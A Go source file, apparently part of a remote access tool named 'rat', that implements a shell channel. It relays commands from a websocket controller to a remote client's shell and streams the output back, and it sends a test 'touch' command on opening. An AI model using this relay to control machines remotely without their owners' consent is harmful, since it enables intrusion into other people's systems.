package main

import (
	"bufio"
	"fmt"
	"io"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ShellChannel struct {
	ws *websocket.Conn
}

func (ShellChannel) Header() header.PacketHeader {
	return header.ShellChannelHeader
}

func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
	/* 	if ws, ok := c.Listeners[header.ShellHeader]; ok {
		return sendMessage(ws, c, ShellCommandMessage{packet.Command})
	} */

	channel.Write([]byte("touch test\n"))

	defer channel.Close()
	listener := c.Listen()
	defer listener.Unlisten()
	go func() {
		for {
			m := <-listener.C

			if m == nil {
				break
			}

			if msg, ok := m.(*ShellMessage); ok {
				fmt.Println("control > command", msg.Command, []byte(msg.Command))
				channel.Write([]byte(msg.Command))
			}
		}
	}()

	r := bufio.NewReader(channel)
	b := make([]byte, 1024)
	for {
		n, err := r.Read(b)
		fmt.Println("client > command", err, string(b[:n]), b[:n])
		if err != nil {
			break
		}

		sendMessage(data.ws, c, ShellCommandMessage{string(b[:n])})
	}

	return nil
}
